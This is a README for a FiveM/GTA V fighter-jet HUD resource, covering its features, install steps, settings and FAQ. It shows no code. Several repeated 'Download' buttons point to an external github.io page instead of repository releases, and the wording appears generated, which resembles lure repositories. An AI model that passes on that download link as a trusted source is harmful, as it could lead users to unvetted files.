# Solived Fighter Jet HUD v2 - Game Script Utility 2026

> A fighter jet-style HUD for FiveM and GTA V aircraft, created to swap out the default display with cockpit readouts, targeting cues, and flight telemetry.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kingmichael1997/solived-jet-hud-script-v2?style=flat-square)](https://github.com/kingmichael1997/solived-jet-hud-script-v2)

---

<p align="center">
  <a href="https://kingmichael1997.github.io/solived-jet-hud-script-v2/">
    <img src="https://img.shields.io/badge/Download-Solived%20Fighter%20Jet%20HUD-brightgreen?style=for-the-badge" alt="Download Solived Fighter Jet HUD">
  </a>
</p>

> **[Direct Download - Solived Fighter Jet HUD](https://kingmichael1997.github.io/solived-jet-hud-script-v2/)**

---

[Download Latest Build](https://kingmichael1997.github.io/solived-jet-hud-script-v2/)

---

## What it does

Solived Fighter Jet HUD is a self-contained FiveM resource made for GTA V fighter jet scenarios. Instead of the stock cockpit display, it presents a custom HUD aimed at improving flight awareness, weapon presentation, and target response while keeping the focus on aircraft operation.

It is implemented with HTML, JavaScript, and Lua, and it is meant to work without ESX or QBCore. The HUD can surface essential flight telemetry like speed, altitude, heading, pitch, roll, and flight path data, together with weapon reticles, lock indicators, distance readouts, and RWR-style alerts.

---

## Features

- Swaps the default cockpit display for a custom fighter jet HUD
- Renders live flight data such as speed, altitude, heading, pitch, roll, and flight path information
- Shows weapon-dependent reticles and a weapon annunciator
- Reports lock status plus target distance feedback
- Adds RWR-style warning alerts for cockpit situational awareness
- Includes synthesized cockpit audio for supported feedback cues
- Supports vehicle-specific themes and configurable options
- Operates as a standalone resource with no ESX or QBCore requirement

---

## Installation

1. Download the latest build from the release link above.
2. Place the resource folder in your FiveM server's resources directory.
3. Rename the folder if needed to match your server setup.
4. Add the resource to your server configuration.

Example:

    ensure solived-fighter-jet-cockpit-hud-script-v2

If your install uses a different folder name, update the `ensure` line to match it exactly.

---

## Configuration

Most setup changes live in the resource files and theme settings. Usual tweaks cover HUD styling, cockpit behavior, and how audio or warnings are presented.

| Setting | Purpose |
| --- | --- |
| Vehicle theme | Adjusts HUD appearance for supported aircraft profiles |
| Telemetry layout | Controls how flight data is arranged on screen |
| Weapon display | Enables weapon reticle and annunciator presentation |
| Lock feedback | Shows target lock and distance status |
| Warning alerts | Configures RWR-style notifications |
| Audio cues | Toggles synthesized cockpit sound behavior |

If you edit script settings, keep the resource structure intact so FiveM can load the files correctly.

---

## Compatibility notes

Solived Fighter Jet HUD is intended for FiveM and GTA V fighter jet or vehicle HUD scenarios. It is described as a standalone resource, so it does not depend on ESX or QBCore frameworks.

Known limitations may include:

- Behavior can vary by aircraft or vehicle setup
- Theme support depends on the configuration provided in the resource
- Visual results may differ with custom server-side UI stacks
- The script is focused on cockpit-style HUD use rather than general vehicle gameplay

---

## FAQ

**How do I install it?**  
Download the resource, place it in your FiveM resources folder, and add the correct `ensure` line to your server config.

**Does it require a framework?**  
No. The profile describes it as a standalone resource without ESX or QBCore.

**Can I customize the display?**  
Yes. Vehicle-specific themes and configuration support are included, so visual and behavioral settings can be adjusted through the resource files.

**What game is it for?**  
It is aimed at GTA V aircraft use inside FiveM.

**Where are the files stored after installation?**  
Store them anywhere inside your server resources directory, as long as the folder name matches the `ensure` entry.

**How are updates handled?**  
Use the latest build link above to check for newer releases and replace the resource files as needed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
